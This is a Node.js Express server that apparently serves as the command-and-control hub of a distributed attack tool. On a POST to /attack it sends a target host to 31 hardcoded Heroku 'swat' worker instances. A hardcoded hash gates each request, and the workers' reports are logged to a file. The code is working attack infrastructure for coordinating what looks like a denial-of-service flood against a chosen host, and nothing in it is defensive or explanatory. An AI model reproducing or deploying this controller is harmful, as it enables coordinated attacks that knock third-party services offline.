var express = require('express');
var path = require('path');

var Req = require('request');

var fs = require('fs');

var app = express();
var run = false;
var ak = {}

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(function (req,res,next) {
  if(!req.query.hash || req.query.hash !== "1111991")
  {
    res.status(403);
    res.end('your are banned');
    return;
  }

  next();
});



app.post('/attack',function (req,res ) {
  var host = req.body.host;
  res.end('done');
  run = true;

  sendCmd([
  'https://swat-1.herokuapp.com/',
  'https://swat-2.herokuapp.com/',
  'https://swat-3.herokuapp.com/',
  'https://swat-4.herokuapp.com/',
  'https://swat-5.herokuapp.com/',
  'https://swat-6.herokuapp.com/',
  'https://swat-7.herokuapp.com/',
  'https://swat-8.herokuapp.com/',
  'https://swat-9.herokuapp.com/',
  'https://swat-10.herokuapp.com/',
  'https://swat-11.herokuapp.com/',
  'https://swat-12.herokuapp.com/',
  'https://swat-13.herokuapp.com/',
  'https://swat-14.herokuapp.com/',
  'https://swat-15.herokuapp.com/',
  'https://swat-16.herokuapp.com/',
  'https://swat-17.herokuapp.com/',
  'https://swat-18.herokuapp.com/',
  'https://swat-19.herokuapp.com/',
  'https://swat-20.herokuapp.com/',
  'https://swat-21.herokuapp.com/',
  'https://swat-22.herokuapp.com/',
  'https://swat-23.herokuapp.com/',
  'https://swat-24.herokuapp.com/',
  'https://swat-25.herokuapp.com/',
  'https://swat-26.herokuapp.com/',
  'https://swat-27.herokuapp.com/',
  'https://swat-28.herokuapp.com/',
  'https://swat-29.herokuapp.com/',
  'https://swat-30.herokuapp.com/',
  'https://swat-31.herokuapp.com/',

],host);


});

app.post('/reg',function (req,res) {
  res.end('saved');
  var txt = req.body.s;
  var id = req.body.id;
  delete ak[id];
  save(txt);
});


app.head('/',function (req,res) {
  res.writeHead(200,
    {'type': 'swat',
    'ready': !run
  });
  res.end();
});



app.get('/', function (req,res) {
  res.sendFile(__dirname+'/log.txt');
});

app.use(function (req,res) {
  res.status(404);
  res.end('Not Found');
});


function save(txt) {
  var date = getNow();
  date = new Date(date).toTimeString();

  fs.appendFile('log.txt', '\n'+date+'  ::'+txt, function (err) {
  if (err) throw err;
  console.log('Updated!');
  if (ak.length == 0) {
    run = false;
  }
});


}



function sendCmd(servers,host) {
var s = 0;
var e = servers.length;
var limit = 5;

var onSucess = function (err,rr,body) {
  if (err)
  {
    console.log(err);
    return;
  }
    s++;
    ak[s] = true;
    console.log('cmd '+ s +' success');
    console.log(body);
    if (s >= e)
    {

    }
    else send();


}

var send = function () {
  var pin = '1111991';
  var url = servers[s] + 'attack/?hash='+pin;
  console.log(url);
  Req.post({
    url:url,
    form:{
      host:host,
      limit:limit,
      id:s+1,
    }
  },onSucess);
}

send();




}

function getNow() {
  var iraq = new Date().getTime();
  return iraq;
}

//sendCmd(['http://localhost:2000/'],'http://localhost/');


module.exports = app;
